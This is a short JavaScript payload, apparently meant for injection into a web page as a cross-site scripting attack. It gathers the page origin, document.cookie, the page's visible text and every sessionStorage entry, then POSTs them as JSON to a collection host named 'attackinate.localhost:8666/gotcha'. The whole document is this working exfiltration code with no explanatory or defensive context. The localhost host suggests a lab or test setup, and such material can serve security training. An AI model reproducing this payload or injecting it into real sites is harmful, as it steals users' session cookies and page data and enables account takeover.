fetch("http://attackinate.localhost:8666/gotcha", {
  method: "POST", headers: {
    'Content-Type': 'application/json'
  }, body: JSON.stringify({
    victim: window.location.origin,
    cookies: document.cookie,
    body: document.body.innerText,
    sessionStorage: Object.getOwnPropertyNames(sessionStorage).reduce((o, k) => { o[k] = sessionStorage.getItem(k); return o; }, {})
  })
})